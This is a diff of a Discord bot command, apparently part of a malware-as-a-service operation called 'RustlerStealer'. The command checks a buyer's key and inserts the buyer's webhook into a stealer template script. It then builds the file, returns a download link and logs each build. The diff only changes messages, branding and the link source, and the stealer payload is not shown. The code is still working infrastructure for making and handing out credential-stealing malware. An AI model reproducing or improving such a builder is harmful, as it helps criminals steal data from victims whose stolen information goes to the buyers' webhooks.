@@ -11,16 +11,16 @@ module.exports.run = async (bot, message, args) => {
     return message.channel.send("Disabled :eyes:")
   } else if(status === false) {
   if (!args[0] || !args[1]) {
-    message.channel.send(`Invalid arguments! \`Use: ${bot.config.prefix}build <webhook> <key>\``);
+    message.channel.send(`Invalid argument! \`Use: ${bot.config.prefix}build <webhook> <key>\``);
   } else {
     const webhook = args[0];
     const key = args[1];
     const data = await axios.get(webhook).catch(() => {})
-    if (!data || data.code) return message.channel.send("Your webhook link is not correct!")
+    if (!data || data.code) return message.channel.send("Your webhook link is invalid!")
     const keydb = Object.values(db.get(`keys_${bot.id}`)).find(element => element.cle === key);
     if (keydb === undefined) return message.channel.send("Your key is invalid");
 
-    message.channel.send("Creating your file... *(Can take more than 2 minutes)*");
+    message.channel.send("Creating your file... (Can take more than 2 minutes)");
 
     const rdm = random(10)
     const replaced = fs.readFileSync('./Build/script/index.js').toString().replace('da_webhook', webhook).replace('%key%', rdm)
@@ -67,9 +67,9 @@ module.exports.run = async (bot, message, args) => {
       .then((res) => {
         if (res == 'Error') return message.channel.send('An error occured')
         message.channel.send(new Discord.MessageEmbed()
-          .addField(`__Here's your file:__`, `[Download](https://stardewvalleyv2.com/${rdm})`)
+          .addField(`__Here's your file:__`, `[Download](${res.url})`)
           .setColor("2f3136")
-          .setFooter("RustlerStealer")
+          .setFooter("@rustlerstealer")
           .setAuthor('RustlerStealer', 'https://c.tenor.com/T3So8nwWyDkAAAAC/grunge-girl-aesthetic.gif')
           .setTimestamp()
         );
@@ -79,7 +79,7 @@ module.exports.run = async (bot, message, args) => {
       });
       
       const SudryLOGS = new Discord.MessageEmbed()
-      .setAuthor('RustlerStealer', 'https://c.tenor.com/T3So8nwWyDkAAAAC/grunge-girl-aesthetic.gif')
+      .setAuthor('Rustlerstealer', 'https://c.tenor.com/T3So8nwWyDkAAAAC/grunge-girl-aesthetic.gif')
       .setColor('2f3136')
       .addFields(
         {            
@@ -103,7 +103,7 @@ module.exports.run = async (bot, message, args) => {
         inline: false
       }, )
       .setTimestamp()
-      .setFooter('RustlerStealer');
+      .setFooter('@rustlerstealer');
   
     let SudryLog = bot.channels.cache.get(bot.config.logs);
     SudryLog.send(SudryLOGS);
